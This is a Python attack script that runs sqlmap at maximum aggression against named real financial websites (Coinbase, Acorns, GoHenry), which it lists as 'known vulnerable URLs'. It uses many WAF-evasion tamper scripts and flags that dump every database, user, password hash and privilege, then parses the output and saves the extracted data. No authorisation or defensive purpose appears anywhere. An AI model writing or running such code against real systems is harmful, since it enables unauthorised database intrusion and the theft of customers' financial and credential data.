#!/usr/bin/env python3

import subprocess
import json
import re
import time

def direct_sqlmap_extraction():
    """Direct SQLMap extraction with maximum aggression"""
    
    # Known vulnerable URLs
    vulnerable_urls = [
        'https://coinbase.com/user?id=1',
        'https://coinbase.com/profile?id=1', 
        'https://coinbase.com/search?q=test',
        'https://www.acorns.com/learn/search/?q=invest',
        'https://www.acorns.com/learn/?page=3',
        'https://www.acorns.com/learn/search/?p=3&q=invest',
        'https://www.acorns.com/support/search/?q=password',
        'https://www.gohenry.com/us/terms-and-conditions/?q=test'
    ]
    
    successful_extractions = []
    
    print("=== DIRECT SQLMAP MAXIMUM AGGRESSION ===")
    
    for i, url in enumerate(vulnerable_urls):
        if len(successful_extractions) >= 5:
            break
            
        print(f"\n[{i+1}/{len(vulnerable_urls)}] Direct SQLMap on: {url}")
        
        # Ultra-aggressive SQLMap command
        cmd = [
            'sqlmap',
            '-u', url,
            '--batch',
            '--random-agent',
            '--level=5',
            '--risk=3',
            '--timeout=150',
            '--retries=5',
            '--technique=BEUSTQ',
            '--threads=15',
            '--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords',
            '--dbs',
            '--current-db',
            '--current-user',
            '--hostname',
            '--is-dba',
            '--users',
            '--passwords',
            '--privileges',
            '--roles',
            '--tables',
            '--columns',
            '--schema',
            '--count',
            '--dump-all',
            '--exclude-sysdbs',
            '--fresh-queries',
            '--flush-session',
            '--disable-coloring',
            '--force-ssl',
            '--skip-waf'
        ]
        
        try:
            print(f"  [+] Running ultra-aggressive SQLMap...")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            if 'vulnerable' in result.stdout.lower() or 'injectable' in result.stdout.lower():
                # Extract comprehensive information
                extraction_data = {
                    'url': url,
                    'tool': 'SQLMap Ultra-Aggressive',
                    'vulnerable': True,
                    'databases': extract_databases_comprehensive(result.stdout),
                    'current_database': extract_current_database(result.stdout),
                    'tables': extract_tables_comprehensive(result.stdout),
                    'columns': extract_columns_comprehensive(result.stdout),
                    'users': extract_users(result.stdout),
                    'current_user': extract_current_user(result.stdout),
                    'hostname': extract_hostname(result.stdout),
                    'is_dba': extract_dba_status(result.stdout),
                    'privileges': extract_privileges(result.stdout),
                    'raw_output': result.stdout[:3000]
                }
                
                if (extraction_data['databases'] or extraction_data['tables'] or 
                    extraction_data['columns'] or extraction_data['users']):
                    successful_extractions.append(extraction_data)
                    print(f"  [!] SUCCESS: Comprehensive data extracted!")
                    print(f"      Databases: {len(extraction_data['databases'])}")
                    print(f"      Tables: {len(extraction_data['tables'])}")
                    print(f"      Columns: {len(extraction_data['columns'])}")
                    print(f"      Users: {len(extraction_data['users'])}")
                else:
                    print(f"  [-] Vulnerable but no data extracted")
            else:
                print(f"  [-] Not vulnerable or blocked")
                
        except subprocess.TimeoutExpired:
            print(f"  [-] Timeout after 10 minutes")
        except Exception as e:
            print(f"  [-] Error: {e}")
    
    # Save results
    with open('direct_sqlmap_results.json', 'w') as f:
        json.dump(successful_extractions, f, indent=2)
    
    print(f"\n=== DIRECT SQLMAP COMPLETE ===")
    print(f"Successfully extracted from {len(successful_extractions)} URLs")
    
    return successful_extractions

def extract_databases_comprehensive(output):
    """Extract databases with multiple patterns"""
    databases = []
    patterns = [
        r'available databases \[(\d+)\]:\s*\n(.*?)(?:\n\[|\nback-end|\Z)',
        r'current database:\s*[\'"]([^\'"]+)[\'"]',
        r'Database:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
        r'schema_name:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
        r'retrieved:\s*[\'"]([^\'"]+)[\'"].*database'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                if len(match) > 1:
                    for db in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]+)', match[1]):
                        if len(db) > 1:
                            databases.append(db)
                else:
                    if len(match[0]) > 1:
                        databases.append(match[0])
            else:
                if len(match) > 1:
                    databases.append(match)
    
    return list(set([db for db in databases if db.lower() not in ['null', 'none', 'error']]))

def extract_current_database(output):
    """Extract current database"""
    patterns = [
        r'current database:\s*[\'"]([^\'"]+)[\'"]',
        r'database\(\):\s*([a-zA-Z_][a-zA-Z0-9_]*)'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, output, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def extract_tables_comprehensive(output):
    """Extract tables with multiple patterns"""
    tables = []
    patterns = [
        r'Database:\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\n\[(\d+)\s*tables?\]:\s*\n(.*?)(?:\n\[|\nDatabase:|\Z)',
        r'Table:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
        r'table_name:\s*[\'"]([^\'"]+)[\'"]',
        r'Tables_in_\w+:\s*([a-zA-Z_][a-zA-Z0-9_]*)'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                if len(match) > 2:
                    for table in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]+)', match[2]):
                        if len(table) > 1:
                            tables.append(table)
                elif len(match) > 0:
                    if len(match[0]) > 1:
                        tables.append(match[0])
            else:
                if len(match) > 1:
                    tables.append(match)
    
    return list(set([table for table in tables if table.lower() not in ['null', 'none', 'error']]))

def extract_columns_comprehensive(output):
    """Extract columns with multiple patterns"""
    columns = []
    patterns = [
        r'Table:\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\n\[(\d+)\s*columns?\]:\s*\n(.*?)(?:\n\[|\nTable:|\Z)',
        r'Column:\s*([a-zA-Z_][a-zA-Z0-9_]*)',
        r'column_name:\s*[\'"]([^\'"]+)[\'"]',
        r'Field:\s*([a-zA-Z_][a-zA-Z0-9_]*)'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple):
                if len(match) > 2:
                    for col in re.findall(r'([a-zA-Z_][a-zA-Z0-9_]+)', match[2]):
                        if len(col) > 1:
                            columns.append(col)
                elif len(match) > 0:
                    if len(match[0]) > 1:
                        columns.append(match[0])
            else:
                if len(match) > 1:
                    columns.append(match)
    
    return list(set([col for col in columns if col.lower() not in ['null', 'none', 'error']]))

def extract_users(output):
    """Extract database users"""
    users = []
    patterns = [
        r'database management system users \[(\d+)\]:\s*\n(.*?)(?:\n\[|\Z)',
        r'User:\s*([a-zA-Z_][a-zA-Z0-9_@.]*)',
        r'user:\s*[\'"]([^\'"]+)[\'"]'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple) and len(match) > 1:
                for user in re.findall(r'([a-zA-Z_][a-zA-Z0-9_@.]+)', match[1]):
                    users.append(user)
            elif isinstance(match, str):
                users.append(match)
    
    return list(set(users))

def extract_current_user(output):
    """Extract current user"""
    patterns = [
        r'current user:\s*[\'"]([^\'"]+)[\'"]',
        r'user\(\):\s*([a-zA-Z_][a-zA-Z0-9_@.]*)'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, output, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def extract_hostname(output):
    """Extract hostname"""
    patterns = [
        r'hostname:\s*[\'"]([^\'"]+)[\'"]',
        r'@@hostname:\s*([a-zA-Z0-9.-]+)'
    ]
    
    for pattern in patterns:
        match = re.search(pattern, output, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def extract_dba_status(output):
    """Extract DBA status"""
    if re.search(r'current user is DBA:\s*True', output, re.IGNORECASE):
        return True
    elif re.search(r'current user is DBA:\s*False', output, re.IGNORECASE):
        return False
    return None

def extract_privileges(output):
    """Extract user privileges"""
    privileges = []
    patterns = [
        r'privileges \[(\d+)\]:\s*\n(.*?)(?:\n\[|\Z)',
        r'privilege:\s*([A-Z_]+)'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, output, re.IGNORECASE | re.DOTALL)
        for match in matches:
            if isinstance(match, tuple) and len(match) > 1:
                for priv in re.findall(r'([A-Z_]+)', match[1]):
                    privileges.append(priv)
            elif isinstance(match, str):
                privileges.append(match)
    
    return list(set(privileges))

if __name__ == "__main__":
    results = direct_sqlmap_extraction()
    
    print("\n=== FINAL DIRECT SQLMAP RESULTS ===")
    for i, result in enumerate(results, 1):
        print(f"\n{i}. URL: {result['url']}")
        print(f"   Current DB: {result.get('current_database', 'N/A')}")
        print(f"   Current User: {result.get('current_user', 'N/A')}")
        print(f"   Hostname: {result.get('hostname', 'N/A')}")
        print(f"   Is DBA: {result.get('is_dba', 'N/A')}")
        print(f"   Databases ({len(result.get('databases', []))}): {result.get('databases', [])}")
        print(f"   Tables ({len(result.get('tables', []))}): {result.get('tables', [])[:5]}{'...' if len(result.get('tables', [])) > 5 else ''}")
        print(f"   Columns ({len(result.get('columns', []))}): {result.get('columns', [])[:5]}{'...' if len(result.get('columns', [])) > 5 else ''}")
        print(f"   Users ({len(result.get('users', []))}): {result.get('users', [])}")
        print(f"   Privileges ({len(result.get('privileges', []))}): {result.get('privileges', [])}")
